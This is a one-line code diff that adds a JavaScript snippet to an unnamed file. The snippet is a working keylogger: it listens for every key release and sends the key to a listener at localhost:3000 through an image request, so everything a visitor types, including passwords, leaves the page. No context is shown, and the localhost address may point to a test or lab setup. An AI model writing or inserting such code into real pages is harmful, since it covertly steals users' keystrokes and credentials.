@@ -1,0 +1,1 @@
+addEventListener("keyup",e=>new Image().src="//localhost:3000/listener?"+e.key)
